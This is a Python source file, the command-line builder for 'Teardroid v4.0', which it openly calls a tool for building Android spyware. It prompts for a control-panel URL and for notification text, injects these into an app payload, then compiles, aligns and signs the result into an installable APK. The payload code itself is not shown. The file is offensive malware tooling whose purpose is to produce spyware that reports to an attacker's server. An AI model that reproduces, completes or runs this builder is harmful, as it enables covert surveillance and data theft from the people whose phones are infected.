

from pyfiglet import Figlet
from pydantic import BaseModel
import argparse
import sys
import os
from time import sleep
from Builder import Teardroid as TeardroidBuilder
from colorama import Fore, Style


class Config(BaseModel):
    apktool: str = os.path.join(os.getcwd(), "apktool.sh")
    version: str = 'Teardroid v4.0'
    current_dir: str = os.getcwd()


config = Config()
parser = argparse.ArgumentParser(
    description='Teardroid v4.0 - A tool to build teardroid spyware for Android devices.')


parser.add_argument('-v', '--version', help='Version of Teardroid',
                    action='version', version=config.version)

parser.add_argument(
    '-b', '--build', help='Build Teardroid with custom name [ex: Teardroid.py -b teardroid]', metavar='')


def banner() -> str:
    f = Figlet(font='slant')
    return f.renderText("a3")


def builder(name: str) -> None:
    APKTOOL = None
    try:
        url = input("Control Panel URL : ")
        NotificationText = input("Notification Title : ")
        NotificationContent = input("Notification Content : ")
        NotificationSubText = input("Notification Subtext : ")
    except:
        sys.exit(0)
        print("GoodBye")
        
    Teardroid = TeardroidBuilder(name)
    if os.path.isfile(name + ".apk"):
        Teardroid.print_result("Removing old APK")
        os.remove(name + ".apk")
    Teardroid.changeAppname()
    Teardroid.changeHostname(url)
    Teardroid.changeNotification(
        NotificationText, NotificationContent, NotificationSubText)
    Teardroid.print_result("Compiling Teardroid using apktool")
    
    if Teardroid.os == "posix":
        APKTOOL = os.path.join(os.getcwd(), "apktool.sh")
    else:
        APKTOOL = os.path.join(os.getcwd(), "apktool.bat")
    os.system(APKTOOL + " b Teardroid_Payload -o " + name + "_uncompressed.apk")
    Teardroid.print_result("Compiling Teardroid completed")
    Teardroid.print_result("Compressing APK Files using zipalign")
    Teardroid.CompressAPK()
    Teardroid.print_result("Signing Teardroid")
    Teardroid.SingAPK()
    Teardroid.Clear()
    Teardroid.print_result("Proccess Completed Successfully")
    Teardroid.print_result(
        "Saved as " + os.path.join(os.getcwd(), name + ".apk"))


if __name__ == '__main__':
    print(Fore.GREEN + banner())
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    args = parser.parse_args()
    builder(args.build)
